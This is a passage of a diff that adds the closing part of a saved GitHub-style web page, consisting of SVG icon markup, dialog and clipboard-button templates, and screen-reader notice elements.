+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+    </button>
+    You can’t perform that action at this time.
+  </div>
+
+    <template id="site-details-dialog">
+  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open>
+    <summary role="button" aria-label="Close dialog"></summary>
+    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
+      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
+        <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+      </button>
+      <div class="octocat-spinner tmp-my-6 js-details-dialog-spinner"></div>
+    </details-dialog>
+  </details>
+</template>
+
+    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
+  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
+  </div>
+</div>
+
+    <template id="snippet-clipboard-copy-button">
+  <div class="zeroclipboard-container position-absolute right-0 top-0">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2 tmp-m-2">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2 tmp-m-2">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div>
+</template>
+<template id="snippet-clipboard-copy-button-unpositioned">
+  <div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div>
+</template>
+
+
+
+
+    </div>
+    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true" ></div>
+    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
+  </body>
+</html>
